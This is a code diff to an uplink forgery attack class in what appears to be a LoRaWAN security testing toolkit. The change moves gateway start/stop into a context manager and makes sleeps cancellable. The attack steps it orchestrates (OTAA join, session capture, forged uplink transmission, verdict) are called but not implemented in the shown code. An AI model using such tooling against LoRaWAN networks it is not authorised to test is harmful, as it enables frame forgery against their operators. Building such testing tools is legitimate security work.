@@ -26,6 +26,8 @@ from lora_attack_toolkit.attacks.result import (
     ExecutionStatus,
     SecurityVerdict,
 )
+from lora_attack_toolkit.lorawan.time_utils import interruptible_sleep
+from lora_attack_toolkit.attacks.lifecycle import gateway_lifecycle
 from lora_attack_toolkit.config import UplinkForgeryConfigV1
 from lora_attack_toolkit.lorawan.frames import build_unconfirmed_data_up
 from lora_attack_toolkit.lorawan.join import perform_otaa_join
@@ -246,57 +248,54 @@ class UplinkForgeryAttack(BaseAttack):
     # ── Core execution ────────────────────────────────────────────────────────
 
     def _run(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> AttackResult:
-        ctx.gateway.start()
-        time.sleep(0.5)
+        with gateway_lifecycle(ctx.gateway):
+            interruptible_sleep(0.5, ctx.cancel_event)
 
-        # 1. OTAA join
-        if cfg.perform_join:
-            ctx.logger.info("uplink_forgery_join_started")
-            if not perform_otaa_join(
-                device=ctx.device,
-                gateway=ctx.gateway,
-                radio=ctx.radio,
-                timeout_sec=5.0,
-                logger=ctx.logger,
-            ):
-                ctx.gateway.stop()
-                return AttackResult.failed(
-                    attack_name=self.name,
-                    attack_type="uplink_forgery",
-                    error="OTAA join failed",
-                    message="OTAA join failed — cannot proceed with forgery",
-                )
-            ctx.logger.info("uplink_forgery_join_succeeded")
+            # 1. OTAA join
+            if cfg.perform_join:
+                ctx.logger.info("uplink_forgery_join_started")
+                if not perform_otaa_join(
+                    device=ctx.device,
+                    gateway=ctx.gateway,
+                    radio=ctx.radio,
+                    timeout_sec=5.0,
+                    logger=ctx.logger,
+                ):
+                    return AttackResult.failed(
+                        attack_name=self.name,
+                        attack_type="uplink_forgery",
+                        error="OTAA join failed",
+                        message="OTAA join failed — cannot proceed with forgery",
+                    )
+                ctx.logger.info("uplink_forgery_join_succeeded")
 
-        # 2. Baseline uplinks
-        self._send_baseline_uplinks(ctx, cfg)
+            # 2. Baseline uplinks
+            self._send_baseline_uplinks(ctx, cfg)
 
-        # 3. Capture session context
-        session = self._capture_session(ctx, cfg)
+            # 3. Capture session context
+            session = self._capture_session(ctx, cfg)
 
-        # 4–5. Build and transmit forged uplink
-        evidence = self._forge_and_transmit(ctx, cfg, session)
+            # 4–5. Build and transmit forged uplink
+            evidence = self._forge_and_transmit(ctx, cfg, session)
 
-        # 6. Drain RX window
-        evidence.downlink_count = self._drain_rx_window(ctx, evidence.tx_timestamp)
-        evidence.downlink_received = evidence.downlink_count > 0
+            # 6. Drain RX window
+            evidence.downlink_count = self._drain_rx_window(ctx, evidence.tx_timestamp)
+            evidence.downlink_received = evidence.downlink_count > 0
 
-        # 7. Verification uplinks
-        if cfg.verification_uplink_count > 0 and cfg.forgery_mode not in {
-            "wrong_devaddr",
-            "valid_mic_modified_payload",
-        }:
-            evidence.verification_accepted = self._send_verification_uplinks(ctx, cfg)
+            # 7. Verification uplinks
+            if cfg.verification_uplink_count > 0 and cfg.forgery_mode not in {
+                "wrong_devaddr",
+                "valid_mic_modified_payload",
+            }:
+                evidence.verification_accepted = self._send_verification_uplinks(ctx, cfg)
 
-        # 8. Verdict
-        evidence.verdict = determine_forgery_verdict(
-            forgery_mode=cfg.forgery_mode,
-            downlink_received=evidence.downlink_received,
-            verification_accepted=evidence.verification_accepted,
-            mic_strategy=evidence.mic_strategy,
-        )
-
-        ctx.gateway.stop()
+            # 8. Verdict
+            evidence.verdict = determine_forgery_verdict(
+                forgery_mode=cfg.forgery_mode,
+                downlink_received=evidence.downlink_received,
+                verification_accepted=evidence.verification_accepted,
+                mic_strategy=evidence.mic_strategy,
+            )
 
         ctx.logger.info(
             "uplink_forgery_completed mode=%s verdict=%s downlinks=%d",
@@ -331,7 +330,7 @@ class UplinkForgeryAttack(BaseAttack):
             ctx.gateway.await_downlink(timeout_sec=_RX_DRAIN_SEC)
             remaining = max(0.0, cfg.uplink_interval_sec - _RX_DRAIN_SEC)
             if remaining > 0 and i < cfg.baseline_uplink_count - 1:
-                time.sleep(remaining)
+                interruptible_sleep(remaining, ctx.cancel_event)
 
     def _capture_session(
         self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1
@@ -471,7 +470,7 @@ class UplinkForgeryAttack(BaseAttack):
         """Send post-forgery verification uplinks.  Returns True on any downlink."""
         got_downlink = False
         for i in range(cfg.verification_uplink_count):
-            time.sleep(cfg.uplink_interval_sec)
+            interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
             fcnt = ctx.device.runtime.fcnt_up
             frame = ctx.device.build_data_uplink(
                 payload=bytes.fromhex(cfg.payload_hex),
